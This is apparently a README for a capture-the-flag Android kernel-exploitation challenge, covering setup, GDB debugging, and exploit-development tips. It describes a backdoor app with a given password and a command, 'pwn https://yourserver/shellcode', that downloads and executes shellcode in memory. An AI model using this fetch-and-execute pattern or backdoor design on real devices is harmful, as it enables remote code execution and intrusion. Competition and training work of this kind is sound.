# Build the Docker image

```bash
./build-docker-image.sh
```

- Ensure you have 20-25 GB of free disk space.
- The challenge runs a privileged container and requires access to `/dev/kvm`.

# Create the challenge environment

```bash
./corphone create
```

- First time creation takes ~5 minutes due to Cuttlefish initialization. Subsequent boots are much faster.

# Stop / Start / Delete CoRPhone instances

- To stop the challenge (e.g. the kernel crashed) press CTRL+C in the terminal running it, or from another terminal:

```bash
./corphone stop
```

- To start the challenge after the initial image creation (this time the device should boot in ~60 seconds or less, depending on your system.):

```bash
./corphone start
```

- To delete an instance:

```bash
./corphone delete
```

# Interacting with the challenge

- Backdoor APK: `container-ip:1337` - connect with netcat. The password is: **apritisesamo**.
- ADB: `container-ip:6666` - you can also use `scrcpy` and admire the albino pigeon.

If you run the challenge in debug mode:

- GDB: `container-ip:5555` - use `target remote <container-ip>:5555`. The kernel will wait to boot until you attach GDB (don't ask me why).

# Debugging with GDB

- If an instance already exists, delete it:

```bash
./corphone delete
```

- Create a debug image so you can attach GDB:

```bash
./corphone create --debug
```

- This will also set the number of CPUs to 1 and disable KASLR.
- After creating the image with `--debug`, attach GDB to the VM otherwise the kernel won't boot. Don't detach the debugger, or you won't be able to attach it again. Just set a bp and use `continue`.

# Debug image (Optional)

- A lightweight Linux image is provided to speed up initial vulnerability analysis and the early stages of exploit development. The vulnerable module is the same, but the kernel (and the system image of course) differ from Android, so make sure your exploit works on the target device.

# Remote instance

Once you pwn the local instance, open a ticket and we will create a remote instance for your team. On the remote instance adbd is not enabled.

# Some tips

- Compile the exploit statically with `musl-gcc`.
- The backdoor provides a command to download and execute a shellcode in memory. You can use `exp2sc.py` to convert ELF to shellcode and download it from the backdoor with:

```bash
pwn https://yourserver/shellcode
```

- Since the exploit is executed in memory, a good way to capture the output is to write it to a file in `/sdcard/` (e.g. `/sdcard/Download/exp.log`) and use ADB with `tail -f` from another terminal to read it.
- The backdoor app source code is provided but not necessary for the challenge.
- Remember: in Android some syscalls are not available and SELinux is a thing.
- Once you pwned the remote instance, Mattermost (`/data/data/<apk-name-here>`) is where you'll find what you're looking for. There is no local/fake flag for this challenge.
- For any questions, don't hesitate to open a ticket.
